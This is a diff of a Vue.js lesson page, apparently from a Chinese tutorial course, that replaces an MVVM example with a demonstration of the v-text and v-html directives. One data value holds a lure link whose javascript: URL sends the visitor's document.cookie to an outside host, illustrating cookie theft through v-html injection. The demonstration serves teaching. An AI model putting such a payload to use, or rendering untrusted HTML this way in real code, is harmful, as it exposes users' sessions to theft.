@@ -3,27 +3,28 @@
 
 <head>
   <meta charset="UTF-8">
-  <title>理解MVVM</title>
+  <title>v-html指令</title>
   <script src="../js/vue.js"></script>
 </head>
 
 <body>
   <div id="root">
-    <h1>学校名称：{{name}}</h1>
-    <h1>学校地址：{{address}}</h1>
+    <div v-text="str"></div>
+    <div v-html="str"></div>
+    <div v-html="str2"></div>
   </div>
 
   <script>
     Vue.config.productionTip = false
 
-    const vm = new Vue({
+    new Vue({
       el: '#root',
       data: {
         name: '尚硅谷',
-        address: '北京'
+        str: '<h2>你好啊</h2>',
+        str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>这里有你要的资源</a>'
       }
     })
-    console.log(vm)
   </script>
 </body>
 
